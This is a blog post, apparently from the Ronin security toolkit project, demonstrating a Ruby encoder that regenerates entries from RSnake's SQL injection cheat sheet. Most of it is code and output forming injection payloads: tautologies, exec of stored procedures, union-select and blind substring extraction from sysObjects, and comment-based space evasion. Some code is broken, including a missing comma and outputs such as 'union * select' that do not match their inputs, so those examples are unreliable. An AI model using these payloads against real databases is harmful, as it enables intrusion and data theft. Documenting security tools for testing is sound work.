---
layout: post
title: RSnakes SQLi Cheat Sheet using Ronin SQL
author: postmodern
---

One of the planned features listed in the
[Spring Cleaning Campaign (2010)](/blog/2010/01/12/spring-cleaning.html)
was a simple Ruby->SQL encoder for the
[Ronin SQL](http://github.com/ronin-ruby/ronin-sql/) library, to replace the
overly complex Ronin SQL DSL. This encoder would format Ruby Integers,
Strings, Arrays and Hashes into fragments of proper SQL.

The Ruby->SQL encoder has gotten to the point
of being able to recreate most of the examples from
[RSnake's SQL Injection Cheat Sheet](http://ha.ckers.org/sqlinjection/):

    require 'ronin/code/sql' 
    include Ronin

    sql = Code.sql

    sql[1, :or, 1, :eq, 1].to_s
    # => "1 or 1 = 1"

    sql['1', :or '1', :eq, '1'].to_s
    # => "'1' or '1' = '1'"

    sql[1, :exec, :sp_, [sql[:or, :exec, :xp_]]].to_s
    # => "1 exec sp_ (or exec xp_)"

    sql[1, :and, 1, :eq, 1].to_s
    # => "1 and 1 = 1"

    sql['1', :and, 1, :eq, [sql[:select, sql.count(:all), :from, :tablenames]]].to_s
    # => "'1' and 1 = (select count(*) from tablenames)"

    sql[1, :and, sql.user_name(), :eq, 'dbo'].to_s
    # => "1 and user_name() = 'dbo'"

    sql[:DESC, :users].to_s
    # => "DESC users"

    sql[1, :and, :non_existant_table, :eq, '1'].to_s
    # => "1 and non_existant_table = '1'"

    sql[:or, :username, :is, :not, nil, :or, :username, :eq].to_s
    # => "or username is not null or username ="

    sql[1, :and, sql.ascii(sql.lower(sql.substring( [sql[:select, :top, 1, :name, :from, :sysObjects, :where, :xtype, :eq, 'U']], 1, 1))), :gt, 116].to_s
    # => "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype = 'U'),1,1))) > 116"

    sql[1, :union, :all, :select, [1,2,3,4,5,6,:name], :from, :sysObjects, :where, :xtype, :eq, 'U'].to_s
    # => "1 union * select (1,2,3,4,5,6,name) from sysObjects where xtype = 'U'"

    stmt = sql[1, :union, :select, :all, :from, :where]
    stmt.to_s
    # => "1 union select * from where"

    stmt.spaces = false
    stmt.to_s
    # => "1/**/union/**/select/**/*/**/from/**/where"

<div class="note">
  <p>
    I cheated a little by leaving off the prefix/suffix tick-marks used in
    SQL injections.
  <p>
</div>

New SQL fragments are created using the `sql[...]` syntax, and new SQL
function calls are created with `sql.func_name`. Note, that you can nest
SQL fragments by using the `[sql[...]]` or `[sql.func_name(....)]` syntax.
